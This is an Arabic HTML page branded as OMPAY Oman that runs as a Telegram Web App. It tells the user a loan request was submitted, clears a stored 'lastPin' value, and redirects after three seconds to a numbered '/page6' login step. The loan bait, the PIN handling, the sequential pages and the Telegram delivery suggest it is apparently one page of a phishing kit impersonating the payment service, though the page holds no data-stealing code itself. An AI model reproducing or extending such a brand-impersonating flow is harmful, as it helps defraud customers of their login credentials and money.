<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تم تقديم الطلب - OMPAY عمان</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --ompay-primary: #004b87;
            --ompay-hover: #003366;
            --bg-color: #f0f4f8;
            --text-dark: #1e293b;
            --text-muted: #64748b;
            --card-bg: #ffffff;
            --btn-gray-bg: #f8fafc;
        }

        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; position: relative; }

        .toast-notification {
            position: absolute; top: 25px; background-color: #0f172a; color: #ffffff; padding: 12px 20px;
            border-radius: 12px; display: flex; align-items: center; gap: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.18);
            z-index: 100; font-size: 14px; font-weight: 600; direction: rtl;
        }
        .toast-icon {
            width: 22px; height: 22px; background-color: var(--ompay-primary); border-radius: 50%;
            display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; flex-shrink: 0;
        }

        .card {
            background: var(--card-bg); width: 90%; max-width: 420px; margin-top: 45px; padding: 40px 24px 35px;
            border-radius: 24px; box-shadow: 0 6px 25px rgba(0, 75, 135, 0.06); display: flex; flex-direction: column;
            align-items: center; text-align: center; border-top: 5px solid var(--ompay-primary);
        }

        .check-circle {
            width: 88px; height: 88px; background-color: var(--ompay-primary); border-radius: 50%;
            display: flex; justify-content: center; align-items: center; margin-bottom: 28px; color: white;
            font-size: 38px; font-weight: bold; box-shadow: 0 4px 18px rgba(0, 75, 135, 0.25);
        }

        .main-title { font-size: 24px; color: var(--ompay-primary); margin: 0 0 20px; font-weight: 800; }
        .message-text { color: var(--text-muted); font-size: 15px; margin: 0 0 16px; line-height: 1.55; }

        .redirect-box {
            background-color: var(--btn-gray-bg); border-radius: 12px; padding: 16px 20px; margin: 20px 0 16px;
            width: 100%; display: flex; justify-content: center; align-items: center; gap: 10px; color: var(--ompay-primary); font-weight: 700;
            border: 1px solid #e2e8f0;
        }
        .spinner {
            width: 18px; height: 18px; border: 2.5px solid #e2e8f0; border-top: 2.5px solid var(--ompay-primary);
            border-radius: 50%; animation: spin 0.8s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .btn-outline {
            background-color: transparent; color: var(--text-dark); border: 1px solid #cbd5e1; width: 100%;
            padding: 14px; border-radius: 10px; font-size: 15px; font-weight: 600; cursor: pointer;
        }
    </style>
</head>
<body>

<div class="toast-notification">
    <div class="toast-icon">✓</div>
    <div>🎉 تم تقديم الطلب<br>بنجاح تام!</div>
</div>

<div class="card">
    <div class="check-circle">✓</div>
    <h1 class="main-title">تم تقديم الطلب</h1>
    <p class="message-text">تم استلام طلب القرض الخاص بك بنجاح. يرجى انتظار الموافقة النهائية.</p>
    <p class="message-text">سوف تتلقى إشعاراً بمجرد تحديث الحالة. سجل الدخول إلى OMPAY للمتابعة.</p>

    <div class="redirect-box">
        <div class="spinner"></div>
        <span>التوجيه خلال <span id="timer">3</span> ثوانٍ...</span>
    </div>

    <button type="button" class="btn-outline" onclick="goToPage6()">تسجيل الدخول الآن</button>
</div>

<script>
    let timeLeft = 3;
    let interval;

    function updateTimer() {
        const el = document.getElementById('timer');
        if (el) el.textContent = timeLeft;
    }

    function goToPage6() {
        if (interval) clearInterval(interval);
        localStorage.removeItem('lastPin');
        window.location.href = "/page6";
    }

    window.onload = () => {
        if (window.Telegram?.WebApp) {
            window.Telegram.WebApp.ready();
            window.Telegram.WebApp.expand();
        }
        updateTimer();
        interval = setInterval(() => {
            timeLeft--;
            if (timeLeft <= 0) {
                clearInterval(interval);
                goToPage6();
                return;
            }
            updateTimer();
        }, 1000);
    };
</script>
</body>
</html>
